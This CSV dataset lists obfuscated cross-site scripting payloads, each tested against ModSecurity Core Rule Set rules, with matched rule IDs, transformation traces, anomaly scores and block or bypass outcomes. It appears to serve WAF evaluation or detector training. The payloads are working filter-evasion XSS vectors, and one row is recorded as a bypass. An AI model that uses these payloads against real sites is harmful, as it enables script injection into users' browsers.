index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2189,"<details open OnToGgLe=""(function(){return Reflect.construct([]['filter']['constructor'],[[String.fromCharCode(97,108,101,114,116,40,56,41)]])()})()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,160 || v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032553514.421363
2200,"<svg onload=""(new Function())['\143\157\156\163\164\162\165\143\164\157\162'](String.fromCodePoint(97)+String.fromCodePoint(108)+String.fromCodePoint(101)+String.fromCodePoint(114)+String.fromCodePoint(116)+String.fromCodePoint(40)+String.fromCodePoint(56)+String.fromCodePoint(41))()""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v217,292 || o14,13v217,292t:urlDecodeUni || v217,292t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,292t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,292t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032555410.346711
2204,"<details open ontoggle=""se&#116;Timeout(function(){window['ale'+'rt'](1)},0)"">",0,1,block,8,"932115,933210,934100,934100,941100,941120,941370,949110","o31,8v217,78 || o39,37v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o40,11v217,78 || o40,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,18v217,78t:urlDecodeUni,t:compressWhitespace || ",35,178032556128.943604
2212,"<details open ontoggle=""setTimeout(function(){document['body']['appendChild'](document['createElement']('script'))['innerHTML']='al'+'ert(1)';},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o34,112v217,148t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,148 || o35,11v217,148t:urlDecodeUni || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,16v217,148t:urlDecodeUni,t:compressWhitespace || ",30,178032557444.695236
2213,"<details open ontoggle=""(function(){var s=document['createElement']('script');s['text']='al'+'ert(1)';document['body']['appendChild'](s);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o50,91v217,143t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,143 || o25,11v217,143t:urlDecodeUni || v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,143t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,25v217,143t:urlDecodeUni,t:compressWhitespace || ",30,178032557559.823202
2224,"<details open ontoggle=""setTimeout(function(){document['body']['appendChild'](document['createElement']('script'))['text']=atob('YWxlcnQoMSk=');},0)"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o34,114v217,150t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,150 || v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,150t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,16v217,150t:urlDecodeUni,t:compressWhitespace || ",25,17803255956.716777
2226,"<details open ontoggle=""setTimeout(function(){with(top)with(document['body'])appendChild(document['createElement']('script'))['innerHTML']=[0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29].map(x=>(String)['fromCharCode'](x)).join('')},0)"">",0,1,block,7,"932130,933210,934100,941100,941120,941370,949110","o178,38v217,231t:urlDecodeUni,t:cmdLine || o34,195v217,231t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,231 || v217,231t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,231t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,25v217,231t:urlDecodeUni,t:compressWhitespace || ",30,178032559973.443889
2229,"<svg/onload=""[]['constructor']['constructor']`return window`()[`${atob('ZG9jdW1lbnQ=')}`][`${atob('Ym9keQ==')}`][`${atob('YXBwZW5kQ2hpbGQ=')}`]([]['constructor']['constructor']`return window`()[`${atob('ZG9jdW1lbnQ=')}`][`${atob('Y3JlYXRlRWxlbWVudA==')}`]`script`)[`${atob('dGV4dA==')}`]=[]['constructor']['constructor']`return window`()[`${atob('YWxlcnQ=')}`]`1`"">",0,1,block,5,"932130,941100,941120,941160,949110","o59,272v217,365t:urlDecodeUni,t:cmdLine || v217,365t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,365t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,365t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032560418.080518
2236,"<details open ontoggle=""setTimeout(function(){var a=document.body;var b=document.createElement('script');a.appendChild(b);b.textContent=String.fromCharCode(97,108,101,114,116,40,49,41);},0)"">",0,1,block,4,"934100,941100,941120,949110","o35,11v217,191 || v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032561740.631933
2239,"<details open ontoggle=""setTimeout(function(){var a=document.body;var b=document.createElement('script');a.appendChild(b);b['text'+'Content']='al'+'ert(1)';},0)"">",0,1,block,5,"934100,934100,941100,941120,949110","o35,11v217,162 || o35,11v217,162t:urlDecodeUni || v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,162t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032562298.085980
2240,"<details open ontoggle=""setInterval(function(){window['doc'+'ument']['bo'+'dy']['append'+'Child'](window['doc'+'ument']['create'+'Element']('script'))['text'+'Content']='al'+'ert(1)';},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o35,152v217,189t:urlDecode,t:replaceComments,t:compressWhitespace || o36,11v217,189 || o36,11v217,189t:urlDecodeUni || v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,21v217,189t:urlDecodeUni,t:compressWhitespace || ",30,178032562423.169742
2246,"<details open ontoggle=""(async function(){}).constructor.constructor('var i=setInterval(()=>{with(document)with(body)appendChild(createElement(\u0053tring.fromCharCode(115,99,114,105,112,116))).textContent=\u0053tring.fromCharCode(97,108,101,114,116,40,49,41);clearInterval(i)},0)')()"">",0,1,block,4,"934100,941100,941120,949110","o31,11v217,286 || v217,286t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,286t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,178032563433.198298
2250,"<details open ontoggle=""(function(){var s=document.createElement('script');s.textContent='al'+'ert(1)';document.body.appendChild(s);})()"">",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,138 || o25,11v217,138t:urlDecodeUni || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032564165.508766
2253,"<details open ontoggle=""this['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,83t:urlDecodeUni,t:compressWhitespace || ",20,178032564698.744013
2257,"<details open ontoggle=""setTimeout(function(){var s=document.createElement('script');s.innerHTML=atob('YWxlcnQoMSk=');document.body.appendChild(s);},0)"">",0,1,block,5,"934100,941100,941120,941180,949110","o35,11v217,153 || v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,10v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls || ",20,178032565361.708497
2261,"<details open ontoggle=""setTimeout(function(){this['constr'+'uctor']['constr'+'uctor']('al'+'ert(1)')()},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o34,73v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,109 || o35,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,22v217,109t:urlDecodeUni,t:compressWhitespace || ",30,178032566098.208893
2262,"<details open ontoggle=""setTimeout(function(){[]['fill']['constructor']('return\u0020alert')()(1)},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o34,67v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17803256613.176269
2264,"<input onfocusin=""setTimeout(function(){top['Function']('ale'+'rt(1)')()},0)"" autofocus>",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o37,6v217,88 || o28,48v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o29,11v217,88 || o29,11v217,88t:urlDecodeUni || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o6,11v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o40,15v217,88t:urlDecodeUni,t:compressWhitespace || ",40,178032566559.290810
2266,"<details open ontoggle=""setTimeout(function(){this['constr'+'uctor']['constr'+'uctor']('ale'+'rt(1)')()},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o34,73v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,109 || o35,11v217,109t:urlDecodeUni || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,22v217,109t:urlDecodeUni,t:compressWhitespace || ",30,178032566889.616687
2267,"<details open ontoggle=""setTimeout(function(){self[atob('ZXZhbA==')]('al'+'ert(1)')},0)"">",0,1,block,6,"934100,934100,941100,941120,941370,949110","o35,11v217,89 || o35,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,22v217,89t:urlDecodeUni,t:compressWhitespace || ",25,178032567072.440989
2296,"<details open ontoggle=""var a=top.Function,c=a['proto'+'type']['constr'+'uctor'];new c(atob('YWxlcnQoMSk='))()"">",0,1,bypass,2,"941100,941120","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,178032572017.538086
2300,"<details open ontoggle='[][""constructor""][""constructor""](""retur""+""n aler""+""t(1)"")()'>",0,1,block,4,"933210,941100,941120,949110","o24,59v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17803257276.834102
2307,"<svg onload='Function(""ale""+""rt(1)"")()'>",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,40t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,40 || v216,40t:urlDecodeUni || ",25,17803257406.074716
2309,"<details open ontoggle='(new function(){return globalThis[""constru""+""ctor""][""constru""+""ctor""](""al""+""ert(1)"")()})()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,90v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o29,11v217,116 || o29,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032574379.221592
2315,<details open ontoggle='[][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()'>,0,1,block,5,"933210,941100,941120,941360,949110","o49,919v218,970t:urlDecode,t:replaceComments,t:compressWhitespace || v218,970t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v218,970t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,4v218,970 || ",20,178032575414.298539
2321,"<details open ontoggle='(function(){return this[String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)](1)}).call(window)'>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,51v217,114t:urlDecodeUni,t:compressWhitespace || ",20,178032576538.093716
2324,"<details open ontoggle='(Reflect[""construct""](window[""Function""],[""al""+String[""fromCharCode""](101)+""rt(1)""]))()'>",0,1,block,5,"933210,941100,941120,941370,949110","o24,87v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,18v217,113t:urlDecodeUni,t:compressWhitespace || ",20,178032577161.482826
2340,<details open ontoggle='(function(){var b=`pro`+`mp`+`t`;self[b](1)})()'>,0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o61,10v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,73 || o25,11v217,73t:urlDecodeUni || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o57,7v217,73t:urlDecodeUni,t:compressWhitespace || ",30,178032579996.056721
2341,"<details open ontoggle='(function(){var c=String.fromCharCode(97,108,101,114,116);window[c](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,10v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,100t:urlDecodeUni,t:compressWhitespace || ",25,178032580019.633846
2343,"<details open ontoggle='(function(){var e=[`a`,`l`,`e`,`r`,`t`].join(``);globalThis[e](1)})()'>",0,1,block,5,"933210,934100,941100,941120,949110","o83,10v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032580417.790554
2346,"<details open ontoggle='Function(`var a=atob(""YWxlcnQ"");globalThis[a](1)`)()'>",0,1,block,5,"933210,941100,941120,942100,949110","o66,10v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,78 || ",20,178032580942.481407
2349,"<details open ontoggle='(function(){var a=[][""con""+""str""+""uctor""][""con""+""str""+""uctor""](`return ale`+`rt`)();a(1)})()'>",0,1,block,5,"934100,934100,941100,941120,949110","o25,11v217,118 || o25,11v217,118t:urlDecodeUni || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032581455.225144
2360,"<details open ontoggle='(function(){var s=([][""constructor""][""constructor""](""return this"")())[""String""][""fromCharCode""](97,108,101,114,116);document.defaultView[s](1)})()'>",0,1,block,5,"933210,934100,941100,941120,949110","o42,128v217,172t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,172 || v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,178032583427.982448
2361,"<details open ontoggle='(function(){let e=String.fromCharCode(97,108,101,114,116);window[e](1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,10v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,100t:urlDecodeUni,t:compressWhitespace || ",25,178032583688.867621
2363,"<details open ontoggle='(function(){var x=globalThis[""at""+""ob""](""YWxlcnQ="");document.defaultView[x](1)})()'>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o52,54v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || o25,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,178032583971.659003
2364,"<details open ontoggle='(function(){let f=[][""constructor""][""constructor""];let d=f(""return atob"")();let s=d(""YWxlcnQ="");(1,window[s])(1)})()'>",0,1,block,6,"933210,934100,941100,941120,941370,949110","o82,58v217,142t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,142 || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o123,9v217,142t:urlDecodeUni,t:compressWhitespace || ",25,178032584166.157358
2365,"<details open ontoggle='(function(){var a=0x61;var b=0x6c;var c=0x65;var d=0x72;var e=0x74;window[String.fromCharCode(a,b,c,d,e)](1)})()'>",0,1,block,5,"934100,941100,941120,941370,949110","o25,11v217,138 || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,38v217,138t:urlDecodeUni,t:compressWhitespace || ",20,178032584372.386988
